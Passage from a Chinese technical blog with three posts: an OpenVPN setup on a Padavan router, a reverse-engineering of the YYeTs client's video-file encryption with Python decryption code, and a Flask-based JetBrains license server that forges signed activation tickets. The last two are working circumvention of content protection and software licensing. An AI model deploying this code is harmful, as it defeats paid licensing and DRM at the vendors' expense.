<li>远程VPN服务器</li>
<li>通信端口</li>
<li>通信协议</li>
<li>封装层</li>
<li>认证类型与用户名密码</li>
<li>认证算法</li>
<li>加密算法</li>
<li>HMAc签名检查</li>
<li>公钥</li>
</ul>
<p>一个完整的ovpn配置文件恰巧会包含一部分如上信息，通过下载opvn文件并打开，我们可以发现如下对应关系：</p>
<p><img src="/images/2018022308363860.jpeg"></p>
<h3 id="添加基本信息"><a href="#添加基本信息" class="headerlink" title="添加基本信息"></a>添加基本信息</h3><p>所以在padavan中我们如下图和opvn配置文件中的信息设置就好了：</p>
<p><img src="/images/2018022308364623.jpeg"></p>
<h2 id="扩展配置"><a href="#扩展配置" class="headerlink" title="扩展配置"></a>扩展配置</h2><p>OpenVPN扩展配置需要添加如下内容：</p>
<p>resolv-retry infinite<br>keepalive 10 60<br>nobind<br>persist-key<br>persist-tun<br>persist-remote-ip<br>verify-x509-name 服务器域名 name<br>verb 3<br>auth SHA256<br>tls-cipher TLS-DHE-RSA-WITH-AES-256-CBC-SHA</p>
<h3 id="添加公钥"><a href="#添加公钥" class="headerlink" title="添加公钥"></a>添加公钥</h3><p>切换到选项卡“OpenVPN证书和密钥”，将opvn配置文件中的公钥贴进去，如下：</p>
<p><img src="/images/2018022308364958.png"></p>
<h3 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h3><ul>
<li>VPN 国内外自动分流：顾名思义，自动分流</li>
<li>通过 VPN 接口转发所有流量：顾名思义，如果选择是，那么所有流量都会通过VPN</li>
</ul>
<h3 id="保存设置"><a href="#保存设置" class="headerlink" title="保存设置"></a>保存设置</h3><p>如果没有问题的话，刷新路由器控制页面就会看到已经连接成功了，打开ipip.net也会看到IP变成了服务器IP</p>
<h2 id="测速"><a href="#测速" class="headerlink" title="测速"></a>测速</h2><p>需要注意的是，路由器可能会存在CPU性能瓶颈，所以可能会有一些影响。不过能够开国内外分流是<strong>一大优点，这样就不用走全局啦</strong>。 <img src="/images/201802230836549.png"></p>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><ul>
<li>速度还是挺快的，于是我就这么水了一贴……？</li>
<li>如果某些网游加速器（比如说网易UU）也是通过建立VPN连接的话，那么我可以抓包，获取到对应的认证信息，然后放到路由器上给Xbox加速用……（然而失败惹</li>
<li>我感觉好像回到了<a target="_blank" rel="noopener" href="https://dmesg.app/internship.html">X公司的N号楼</a>，出口就是香港</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>请严格根据你的opvn文件来进行配置，比如有的opvn会有两个证书，那么就两个都贴进去；有的会要求HMAC TLS-Auth，也要乖乖贴进去哦。</p>
<p>另外SoftEther VPN搭建的Open VPN，只要贴第一个CA就好了。默认配置文件再&#x2F;etc&#x2F;openvpn下</p>
<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="VPN总是自动断开"><a href="#VPN总是自动断开" class="headerlink" title="VPN总是自动断开"></a>VPN总是自动断开</h3><p>感谢<a target="_blank" rel="noopener" href="https://dmesg.app/padavan-vypr.html/comment-page-1#comment-4337">评论区chq123的测试</a>，<strong>终于研究出来了，把 启用 LZO 数据压缩 这个选 否 ，就不会自动重启了。。。哇感动啊，弄了这么久终于弄出来了</strong></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://support.goldenfrog.com/hc/en-us/articles/222083028-VyprVPN-OpenVPN-Setup-for-AsusWRT">VyprVPN OpenVPN Setup for AsusWRT</a></p>
<p><a target="_blank" rel="noopener" href="https://support.goldenfrog.com/hc/en-us/articles/204088603-VyprVPN-OpenVPN-Setup-for-Tomato">VyprVPN OpenVPN Setup for Tomato</a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/all-platform-scientific-internet-all-in-one.html/3">VyprVPN详细信息</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/02/23/padavan-vypr/index/" data-id="clhp7rti0006hs2qr22877noc" data-title="在路由器（padavan）上使用VPN客户端" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-yyets/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/02/10/yyets/index/" class="article-date">
  <time class="dt-published" datetime="2018-02-10T00:00:00.000Z" itemprop="datePublished">2018-02-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>►<a class="article-category-link" href="/categories/security/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/02/10/yyets/index/">解密人人影视客户端加密的视频文件：从C++ Port到Python的经过</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://dmesg.app/jbls.html">我可能走上了移植的不归路</a></p>
<p>在几个月开始给ExpressBot加入人人影视的API的时候，发现有一个很神奇的API，对某个URL进行<code>curl url -C - -Lv -o xxx.mp4</code>，会下载回来一个和原始视频文件一样大小、内容却经过某种加密处理的文件。</p>
<p>前几天经过<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot/issues/3">JasonKhew96</a>的分析，发现是人人影视对视频文件进行了加密。</p>
<h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p>一句话简单概括就是，每4096字节就加密16个字节，加密密钥是file_id+字符串zm+file_id进行一次md5</p>
<h2 id="进一步的分析探讨"><a href="#进一步的分析探讨" class="headerlink" title="进一步的分析探讨"></a>进一步的分析探讨</h2><h3 id="分析相应JSON"><a href="#分析相应JSON" class="headerlink" title="分析相应JSON"></a>分析相应JSON</h3><p>首先，我们先看一下相应吧，大概如下所示：</p>
<p>[<br>{<br>“file_name”: “天赋异禀.彩蛋合集.the.gifted.s01.extras.中英字幕.webrip.aac.720p.x264-人人影视.mp4”,<br>“file_size”: 61001062,<br>“fileid”: “fb755fd1b51c769bfed987e2a8c8b03ee7a8e7cc”,<br>“url”: “<a target="_blank" rel="noopener" href="https://www.zmzfile.com:9043/rt/route?fileid=fb755fd1b51c769bfed987e2a8c8b03ee7a8e7cc">https://www.zmzfile.com:9043/rt/route?fileid=fb755fd1b51c769bfed987e2a8c8b03ee7a8e7cc</a>“<br>},<br>{<br>“file_name”: “天赋异禀.the.gifted.s01e12-13.中英字幕.webrip.aac.720p.x264-人人影视.mp4”,<br>“file_size”: 995104165,<br>“fileid”: “a01975eda089190c7e43fcba5eb91371e54205a6”,<br>“url”: “<a target="_blank" rel="noopener" href="https://www.zmzfile.com:9043/rt/route?fileid=a01975eda089190c7e43fcba5eb91371e54205a6">https://www.zmzfile.com:9043/rt/route?fileid=a01975eda089190c7e43fcba5eb91371e54205a6</a>“<br>},<br>省略…………<br>]</p>
<p>首先观察下这个fileid，40个字符，看样子应该是某个散列函数的摘要，那么应该是SHA1吧。SHA1摘要长度是160位，也就是20个字节，用十六进制表示法就是40个字符了。</p>
<p>然而事实证明，可能并不是这样。我比对了所有已知的散列函数，都没有一样的散列值，猜测可能是加了点“作料”然后再运行的SHA1吧。不过这不重要。</p>
<h3 id="十六进制分析"><a href="#十六进制分析" class="headerlink" title="十六进制分析"></a>十六进制分析</h3><p>为了验证文件究竟被做了怎样的修改，我们必须要准备两个版本的文件：原版的与被加密的。</p>
<p>打开Hex Comparison比较两个文件的异同。</p>
<p>第一处不同：</p>
<p><img src="/images/2018021013220744.png"></p>
<p>文件一开始就发现不同了。这个部分相当重要啦，file命令就是看这里区分文件类型的。</p>
<p>第二处不同：</p>
<p><img src="/images/2018021013221095.png"></p>
<p>注意左侧的十六进制偏移，我们用计算器把它换算成十进制，发现刚好是4096.那么大胆的猜测一下，下一个不同的地方的十进制就应该是8192，对应十六进制就应该是2000，对吧？</p>
<p><img src="/images/2018021013221251.png"></p>
<p>没错哦，真的是这样。那么加密流程就可以这样详细描述了：</p>
<p>将文件以4096字节进行分块，加密每一块中的前16个字节（也就是图上的一行）。如果遇到文件尾恰巧是该加密的块但是又不足16字节（这种概率真的很低），那么如何处理还暂时未知，不过按照常规的思路应该是先padding然后再走加密。</p>
<p>有人可能要问，上面那一行不同明明是32个字符，那么就是32个字节，你怎么睁眼说瞎话呢？唉ε&#x3D;(´ο｀*)))十六进制表示法嘛，下面会细说的。</p>
<h2 id="C-源代码的结构流程分析"><a href="#C-源代码的结构流程分析" class="headerlink" title="C++源代码的结构流程分析"></a>C++源代码的结构流程分析</h2><p>JasonKhew96提供了一个C++版本的可以成功解密文件的源代码，下载可以戳这里<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot/files/1710533/YYeTs.zip">https://github.com/BennyThink/ExpressBot/files/1710533/YYeTs.zip</a></p>
<p>使用CLion打开进行分析，发现流程大概是这样的（我的C&#x2F;C++水平接近于0了，已经完全完蛋了(๑′ᴗ‵๑)）：</p>
<p>主函数的里只有这两句关键代码，第一句猜测是拿到加密的Key，第二步是用Key解密文件。</p>
<p>uint8_t *md5Test &#x3D; getMd5(argv[2]);<br>decrypt_file(md5Test, argv[1]);</p>
<p>我们跳转到getMd5这个函数</p>
<p>char zmzSecret[] &#x3D; “zm”;<br>char bfMd5[82] &#x3D; {};<br>strcat(bfMd5, file_id);<br>strcat(bfMd5, zmzSecret);<br>strcat(bfMd5, file_id);<br>char zmzKey[32];<br>strcpy(zmzKey, md5(bfMd5).c_str());</p>
<p>我们发现思路很简单，就是</p>
<p>fileid &#x3D; “d21a081cc6a32daa85310ca6aad81e378f0b736e” secret &#x3D; “zm” key &#x3D; fileid + secret + fileid</p>
<p>也就是d21a081cc6a32daa85310ca6aad81e378f0b736ezmd21a081cc6a32daa85310ca6aad81e378f0b736e，然后对这个进行一次md5，通过跳转到<code>md5.cpp</code>中，查看对应代码，<code>return md5.hexdigest()</code>我们可以猜测到，这里返回的值是十六进制表示的md5值，也就是我们经常看到的32个字符的MD5值。</p>
<p>小提示：</p>
<p>[v_blue]小提示： 根据维基百科，MD5的摘要长度是128位，那么应该是128&#x2F;8&#x3D;16字节，为什么我们看到的摘要长度都是32呢？哦是这样的，MD5运算之后的结果是二进制，基本上是不可读的（无法正确显示出来），所以我们一般都会把结果转换成十六进制，这样就是可以看到的字符啦。只不过我们是4位转换一个，用两个“字符”表示， 所以128位（16字节）的摘要以16进制表示法显示是32个“字符”啦。[&#x2F;v_blue]</p>
<p>接下来就是一段for循环，反正<strong>当时</strong>我是没太搞懂这段for循环的含义。好吧，就当我们拿到了真正的key，那么我们看下decrypt_file这个函数吧。</p>
<p>逻辑就不细说了，基本上就是判断当前的文件指针位置，需要处理文件大小与文件尾，然后进行解密写入文件。</p>
<h2 id="Port到Python之使用MD5计算AES-Key"><a href="#Port到Python之使用MD5计算AES-Key" class="headerlink" title="Port到Python之使用MD5计算AES Key"></a>Port到Python之使用MD5计算AES Key</h2><p>由于后面需要用到aes，所以这里就都使用<a target="_blank" rel="noopener" href="https://github.com/pyca/cryptography">cryptography</a>啦，要是只进行散列倒是可以用用自带的hashlib呢。</p>
<p>生成摘要很简单，几行而已：</p>
<p>from binascii import hexlify</p>
<p>from cryptography.hazmat.backends import default_backend<br>from cryptography.hazmat.primitives import hashes</p>
<p>digest &#x3D; hashes.Hash(hashes.MD5(), backend&#x3D;default_backend())<br>digest.update(‘hello world’)<br>print hexlify(digest.finalize())</p>
<p>有两点需要注意：</p>
<ol>
<li>要记得MD5的摘要本质上是二进制，所以我们print一定是乱码的，所以我们此时要转换成十六进制表示出来；</li>
<li>要记得<code>digest.update()</code>接受的参数是bytes类型，也就是二进制，所以如果你使用Python 2，那么直接引号包围的就是二进制了，如果你使用Python 3，那么要带b前缀，或者加上<code>encode(&#39;utf-8&#39;)</code>或者<code>bytes(your_str, encoding=&#39;utf-8&#39;)</code>。如果想要计算文件的散列值，那么直接把<code>f.read()</code>传递过去就好了。</li>
</ol>
<h2 id="Port到Python之使用AES-ECB"><a href="#Port到Python之使用AES-ECB" class="headerlink" title="Port到Python之使用AES-ECB"></a>Port到Python之使用AES-ECB</h2><h3 id="简单谈谈AES"><a href="#简单谈谈AES" class="headerlink" title="简单谈谈AES"></a>简单谈谈AES</h3><p>在开始之前，首先我要科普一下，AES是一种对称加密算法，所谓对称加密算法，就是指的加密解密用同一个密钥。在对称加密算法中，可以分成两种，一种是流密码，一种是分组密码（块密码），像AES就是典型的块密码，而RC4是典型的流密码。</p>
<p>顾名思义，块密码就是将明文分成多个等长的模块（不足就padding），使用确定的算法和对称密钥对每组分别加密解密。比如说，AES的块长度固定为128比特，密钥长度则可以是128，192或256比特。也就是说，你的密钥，如果用肉眼可见的字符来说话的话，那么就必须是16字节、24字节、32字节。</p>
<p>另外，块密码有<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">分组模式</a>这种说法，即使是不同的分组模式、相同的密钥也会产生不同的密文。所以我们如果要精确的用AES描述加密，那么大概模式是这样的：</p>
<p>AES-256-CFB，使用AES加密算法，密钥长度是256比特，分组模式是CFB。</p>
<p>分组模式究竟是个啥啊，不同的分组模式之间有啥区别啊，能加密不就行了吗？</p>
<p>不不不这样是远远不够的。由于块密码结构的特殊性，我们必须要定义每一个块与密钥之间的运算关系。像是最简单的电子密码本（Electronic codebook，ECB）模式，就是把每个块和相同的密钥进行加密运算，得到的密文再组合到一起；</p>
<p><img src="/images/2018021013221440.png" alt="File:Ecb encryption.png"></p>
<p>像是密码分组链接（CBC，Cipher-block chaining）模式，每个明文块先与前一个密文块进行异或后，再进行加密，第一个明文块与初始化向量进行异或再加密。</p>
<p><img src="/images/201802101322163.png" alt="File:Cbc encryption.png"></p>
<p>稍微思考一下下我们其实可以得出结论，ECB模式本质上是不安全的（实现最简单，没错）。为什么呢？只要明文块一样，那么得出来的密文也就一样了，无论使用多长的密钥长度都是这样的。有没有想起重放攻击，有没有想起那群<a target="_blank" rel="noopener" href="https://dmesg.app/school-6.html#title-8">自作聪明用HMAC保存密码</a>的人？</p>
<p><img src="/images/2018021013222558.png"></p>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E7%94%B5%E5%AD%90%E5%AF%86%E7%A0%81%E6%9C%AC%EF%BC%88ECB%EF%BC%89">图片来自于维基百科</a></p>
<p>另外，我在推特上保存了这么一张有趣的图，挺好玩的。</p>
<p><img src="/images/2018021013222835.png"></p>
<h3 id="在Cryptography中使用AES"><a href="#在Cryptography中使用AES" class="headerlink" title="在Cryptography中使用AES"></a>在Cryptography中使用AES</h3><p>非常简单，如下几行代码：</p>
<p>from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes<br>from cryptography.hazmat.backends import default_backend</p>
<p>key&#x3D;’1111111111111111’<br>cipher &#x3D; Cipher(algorithms.AES(key), modes.ECB(), backend&#x3D;default_backend())<br>encryptor &#x3D; cipher.encryptor()<br>decryptor &#x3D; cipher.decryptor()<br>ct &#x3D; encryptor.update(“a secret message”) + encryptor.finalize()<br>print ct<br>print decryptor.update(ct) + decryptor.finalize()</p>
<p>有几点需要注意：</p>
<ol>
<li>Key需要16、24或者32字节，数据类型为二进制，也就是Python 2的str，Python 3带b前缀或者encode或者bytes一下；</li>
<li><code>modes.ECB()</code>指定分组模式为ECB模式，如果使用CBC模式，那么还要提供一个初始化向量，如<code>modes.CBC(os.urandom(16))</code>；</li>
<li>密文也是二进制类型的，同进行hash，如果要加密文件，那么直接f.read()传递过去就好了，加密之后的返回值也是二进制；</li>
<li>加密密钥实际上就是MD5散列值，因为MD5散列值恰巧是128比特，恰巧符合需求。需要注意的是，密钥是二进制，所以我们直接把<code>digest.finalize()</code>传过去就好了，不要再hexlify啦。</li>
<li>理论上来说，你用什么密钥都是可以解密确定的密文的，只是正确的密钥会解密出来有意义的东西（比如说写给你的情书），错误的密钥会解密出来无意义的东西（一堆胡乱的0和1）。</li>
</ol>
<h2 id="Port到Python之“按位”操作文件"><a href="#Port到Python之“按位”操作文件" class="headerlink" title="Port到Python之“按位”操作文件"></a>Port到Python之“按位”操作文件</h2><p>给人的感觉，Python似乎是一种“高级”的编程语言（我这里的高级指的是对应底层的那个意思），没有指针，也没有各种精灵古怪的概念。那Python怎么按照比特操纵文件呢？</p>
<p>其实是有的，我们想一想，对文件句柄执行read的时候，read是要一个参数的啊，如果你参数是1，那么就是读一个字节啦。</p>
<p>所以如果要读前16个字节，那么可以这么做：</p>
<p>raw_file &#x3D; open(‘sample.mp4’, ‘rb’)<br>print hexlify(raw_file.read(16))</p>
<p>转换成十六进制之后，看看结果是不是和hexcompare中第一行一样的？</p>
<p><img src="/images/2018021013223069.png"></p>
<p>那接下来的问题就好办了，继续读4080个字节，写入文件，然后读16个解密，读4080……那……文件尾怎么办？不要担心，当我们读到文件尾的时候，<code>read()</code>的返回值就会是布尔假，我们就会有终止条件了，不用我们操心判断这那的。</p>
<p>所以操作文件这块我们可以这么写（注意要以rb、wb模式读写文件）：</p>
<p>data &#x3D; 1<br>while data:<br>    data &#x3D; raw_file.read(16)<br>    final_file.write(decrypt(data, key))<br>    data &#x3D; raw_file.read(4080)<br>    final_file.write(data)</p>
<p>其中decrypt是用于解密的函数，边处理边写入文件。</p>
<p>所以糅合一下，加上单元测试。这个玩意基本上就写完了。总计52行，很精简吧。</p>
<h2 id="通过dnspy反编译结果"><a href="#通过dnspy反编译结果" class="headerlink" title="通过dnspy反编译结果"></a>通过dnspy反编译结果</h2><p>大概只搜索到了这么一个有用的信息块，可以清楚看到，使用AES-ECB模式，不填充？？</p>
<p><img src="/images/2018021013223279.png"></p>
<h2 id="本项目的代码"><a href="#本项目的代码" class="headerlink" title="本项目的代码"></a>本项目的代码</h2><p>欢迎Star、PR、Fork，目前还差一个file_id生成的问题。 [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/yyets-restorer'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/yyets-restorer&#39;\]开源地址\[/gt\]</a></p>
<h2 id="最后的一些点评"><a href="#最后的一些点评" class="headerlink" title="最后的一些点评"></a>最后的一些点评</h2><p>人人影视宣传语中有一句话我印象特别清楚：</p>
<blockquote>
<p>全程<strong>加密</strong>的P2P传输，保证安全，海外用户也不用担心被运营商起诉。</p>
</blockquote>
<p>是的就是<strong>加密</strong>这俩字，我特敏感。</p>
<p>从开头用Postman咱能发现，是post的https地址（买了一年的泛域名证书），然后被跳转到了http的各路IP，下载回来面目全非的的文件，再进行解密。叫我怎么说呢……运营商应该不会像我这么无聊，也是个办法吧……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/02/10/yyets/index/" data-id="clhp7rtnu00bus2qr01dqfkmb" data-title="解密人人影视客户端加密的视频文件：从C++ Port到Python的经过" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-jbls/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/02/06/jbls/index/" class="article-date">
  <time class="dt-published" datetime="2018-02-06T00:00:00.000Z" itemprop="datePublished">2018-02-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>►<a class="article-category-link" href="/categories/program/share/">share</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/02/06/jbls/index/">JetBrains License Server原理及40行Python代码的实现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Repository: [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://coding.net/u/BennyThink/p/pyJetBrains/_license/_server'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://coding.net/u/BennyThink/p/pyJetBrains\_license\_server&#39;\]开源地址\[/gt\]</a></p>
<p>[v_error]警告： 本文仅供学习参考，请勿用于其他用途。如果你喜欢JetBrains的产品，请购买正版授权。[&#x2F;v_error] [v_blue]近期license server升级，可以阅读官方的<a target="_blank" rel="noopener" href="https://www.jetbrains.com/license-server/outdated-ls/">这篇文章</a>，在2018.2.1（2018年第三季度左右发布）之后旧版服务器将无法使用，所以先别升级到2018.2.1，留在2018.2吧。关于新的激活服务器，似乎有点难度，欢迎各位提供任何可能会有帮助的资料和工具（包括但不限于本地激活器，license server，以及相关介绍文章和抓包记录等），更多详情请参考文末记录[&#x2F;v_blue]</p>
<p>估计是个程序员都应该使用过<a target="_blank" rel="noopener" href="https://www.jetbrains.com/">JetBrains</a>的IDE（尤其是Python程序员吧）。JetBrains的产品线非常丰富，PHP的PHPStorm，前端的Webstorm，Python的Pycharm，Java的IntelliJ，Ruby的RubyMine，Go的Goland，数据库的DataGrip……</p>
<p>几个月之前，我曾经尝试着把Java版本的License Server 移植到Python，但是失败了。但是今天我就成功了……好了不废话了，咱来一步一步的学习下怎么用40行代码写一个JetBrains License Server</p>
<h2 id="JetBrains-License-Server激活流程"><a href="#JetBrains-License-Server激活流程" class="headerlink" title="JetBrains License Server激活流程"></a>JetBrains License Server激活流程</h2><p>打开IDE，依次点击Help-Register，输入服务器地址，点击Activate</p>
<p><img src="/images/2018020602360796.png"></p>
<p>这时就会从 License Server取得一个Ticket了。</p>
<p>[v_blue]友情提示：</p>
<p>如果你有edu邮箱的话，那快去申请免费正版授权吧，哪怕你没有edu邮箱，也可以试试什么注册edu邮箱的，比如说<a target="_blank" rel="noopener" href="https://free.kirito.edu.rs/">这个</a>[&#x2F;v_blue]</p>
<h2 id="抓包与分析"><a href="#抓包与分析" class="headerlink" title="抓包与分析"></a>抓包与分析</h2><p>网上已经有人写好了几个版本的授权服务器，我参考了<a target="_blank" rel="noopener" href="https://coding.net/u/chenq_/p/license/git">Java版</a>的、<a target="_blank" rel="noopener" href="https://github.com/xczh/jetserver">golang版</a>的还有<a target="_blank" rel="noopener" href="https://github.com/springhack/JetBrains-License-Server">JavaScript版</a>的。</p>
<p>于是我找了那个能用的Java版本的，自己搭建，然后尝试激活、抓包并过滤http，进行分析。</p>
<p>通过追踪HTTP流我们能发现，IDE向指定服务器发起了一个GET请求，请求中包含很多参数，之后服务器返回了一个像是散列值，还有一小串XML</p>
<p><img src="/images/201802060236083.png"></p>
<p>IDE请求：</p>
<p>GET &#x2F;rpc&#x2F;obtainTicket.action?buildDate&#x3D;20170719&amp;buildNumber&#x3D;2017.2.2+Build+CL-172.3968.17&amp;clientVersion&#x3D;4&amp;hostName&#x3D;xxxxxxm&amp;machineId&#x3D;51xxxxx20a-14d259f1fc94&amp;productCode&#x3D;cfc7xxxx978-a2a2-46fxxxx405&amp;productFamilyId&#x3D;cfxxxx-ae43-4978-a2a2-46feb1679405&amp;salt&#x3D;1506491409302&amp;secure&#x3D;false&amp;userName&#x3D;xxxx&amp;version&#x3D;2017200&amp;versionNumber&#x3D;2017200</p>
<p>服务器返回：</p>
<!-- 61b3a2f53ffxxxxxxxxx6b132e0270275d12434f217ba3231b5 -->

<p><ObtainTicketResponse><message></message><prolongationPeriod>607875500</prolongationPeriod><responseCode>OK</responseCode><salt>1506491409302</salt><ticketId>1</ticketId><ticketProperties>licensee&#x3D;xxxxx licenseType&#x3D;0 </ticketProperties></ObtainTicketResponse></p>
<p>由此我们可以很清楚的了解到激活的步骤：请求+相应+验证，那么大体猜测一下应该是服务端持有一个私钥，对请求字符串进行加密，然后返回，客户端使用公钥验证。</p>
<h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><p>为了验证我们的猜想，咱其实是要去读其他版本的源代码的……鉴于这个流程挺复杂，要求你会多门语言，所以咱就不演示了……总之，经过我的研读，我发现的细节是这样的：</p>
<p>服务端构造如下的字符串：</p>
<p><ObtainTicketResponse><message></message><prolongationPeriod>607875500</prolongationPeriod><responseCode>OK</responseCode><salt>1506491409302</salt><ticketId>1</ticketId><ticketProperties>licensee&#x3D;xxxxx licenseType&#x3D;0 </ticketProperties></ObtainTicketResponse></p>
<p>其中salt是发起请求时的时间戳（单位毫秒），licensee是发起请求的用户名（其实这个用户名是随便的，在代码里写死也是可以的）。</p>
<p>然后服务器使用RSA with MD5 and PKCS1v15进行加密，把加密后的内容转换为十六进制，加上HTML注释<!-- hex -->（注意前后的两个空格），把十六进制HTML注释和构造的字符串一起返回，客户端使用hex和返回的字符串（以及公钥）进行验证。</p>
<p>其实验证猜想的这一步才是最复杂的，需要参考很多源代码做出适当的实验。</p>
<p>既然猜想已经得到了证实，那么剩下来就开始写了。基础的结构很简单，用flask搭建一个简易的服务器，用cryptography完成密码学相关的操作。</p>
<h2 id="cryptography完成RSA签名与十六进制转换"><a href="#cryptography完成RSA签名与十六进制转换" class="headerlink" title="cryptography完成RSA签名与十六进制转换"></a>cryptography完成RSA签名与十六进制转换</h2><p>Python中比较安全好用的密码学库是<a target="_blank" rel="noopener" href="https://cryptography.io/en/latest/">cryptography</a>（唉 好吧）、<a target="_blank" rel="noopener" href="https://www.dlitz.net/software/pycrypto/">pycrypto</a>（这货很久不更新了，不敢用），顺便说一句，进行安全随机盐散列函数的有<a target="_blank" rel="noopener" href="https://passlib.readthedocs.io/en/stable/index.html">passlib</a>。</p>
<p>首先需要引入对应的库</p>
<p>from cryptography.hazmat.backends import default_backend<br>from cryptography.hazmat.primitives import hashes<br>from cryptography.hazmat.primitives import serialization<br>from cryptography.hazmat.primitives.asymmetric import padding</p>
<p>然后载入key（文件形式）</p>
<p>with open(‘jbls_private_key.pem’) as f:<br>    private_key &#x3D; serialization.load_pem_private_key(f.read(), password&#x3D;None, backend&#x3D;default_backend())</p>
<p>执行加密</p>
<p>i &#x3D; bytes(content)<br>signature &#x3D; private_key.sign(i, padding.PKCS1v15(), hashes.MD5())</p>
<p>转换二进制为十六进制表达</p>
<p>binascii.hexlify(signature)</p>
<p>大概这么五行，我们就完成了加密与转换操作，剩下我们只要在Flask端做一下逻辑处理就好了。</p>
<h2 id="Flask进行逻辑处理"><a href="#Flask进行逻辑处理" class="headerlink" title="Flask进行逻辑处理"></a>Flask进行逻辑处理</h2><p>这一步也很简单，用<code>@app.route()</code>装饰器确定路由，构造字符串与返回。真的是很简单，大概就是如下这么十几行：</p>
<p>@app.route(“&#x2F;rpc&#x2F;obtainTicket.action”)<br>def obtain():<br>    salt &#x3D; request.args.get(‘salt’)<br>    user_name &#x3D; request.args.get(‘userName’)<br>    content &#x3D; “<ObtainTicketResponse><message></message>“ + \<br>        “<prolongationPeriod>607875500</prolongationPeriod><responseCode>OK</responseCode>“ + \<br>        “<salt>“ + salt + “</salt><ticketId>1</ticketId>“ \<br>        “<ticketProperties>licensee&#x3D;” + user_name + “\tlicenseType&#x3D;0\t</ticketProperties>“ \<br>        “</ObtainTicketResponse>“<br>    verification_hex &#x3D; hex_signature(content)<br>    return “<!-- " + verification\_hex + " -->\n” + content</p>
<p>通过Flask的requests拿到salt和username，构造XML，调用函数，返回hex以及XML。</p>
<p>所以加起来，整体代码真的只有不到40行。就算把KEY嵌入到源代码中，也只是43行而已……</p>
<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><h3 id="服务端的请求日志"><a href="#服务端的请求日志" class="headerlink" title="服务端的请求日志"></a>服务端的请求日志</h3><p><img src="/images/201802060236112.png"></p>
<h3 id="客户端显示激活成功"><a href="#客户端显示激活成功" class="headerlink" title="客户端显示激活成功"></a>客户端显示激活成功</h3><p><img src="/images/2018020602361187.png"></p>
<h2 id="附录与FAQ"><a href="#附录与FAQ" class="headerlink" title="附录与FAQ"></a>附录与FAQ</h2><h3 id="监听0-0-0-0"><a href="#监听0-0-0-0" class="headerlink" title="监听0.0.0.0"></a>监听0.0.0.0</h3><p>如果想要把这个服务部署在服务器上，那么最好就监听0.0.0.0，只需要把app.run()写成 app.run(host&#x3D;’0.0.0.0’)即可。</p>
<h3 id="持久运行"><a href="#持久运行" class="headerlink" title="持久运行"></a>持久运行</h3><p>当然我们希望这个Flask程序能够长期运行而不退出，此时我们最好使用supervisor或者systemd啦，详细参考此篇<a target="_blank" rel="noopener" href="https://dmesg.app/linux-keep-running.html">《Linux 怎么让程序持续运行：简单说说几种好玩的办法》</a></p>
<h3 id="示例源代码"><a href="#示例源代码" class="headerlink" title="示例源代码"></a>示例源代码</h3><p>本示例源代码可以到下面的地址查看： [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://coding.net/u/BennyThink/p/pyJetBrains/_license/_server'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://coding.net/u/BennyThink/p/pyJetBrains\_license\_server&#39;\]开源地址\[/gt\]</a></p>
<p>为啥不放到GitHub呢？被DMCA Takedown啦ε&#x3D;ε&#x3D;ε&#x3D;┏(゜ロ゜;)┛</p>
<p>需要注意的是，需要使用pip安装cryptography、flask，并且jbls.py同时支持Python 2和Python 3.</p>
<h3 id="可否提供一个有效的私钥"><a href="#可否提供一个有效的私钥" class="headerlink" title="可否提供一个有效的私钥"></a>可否提供一个有效的私钥</h3><p>不好意思，不提供……至于我这个测试的私钥是在哪找的……你们猜呀。</p>
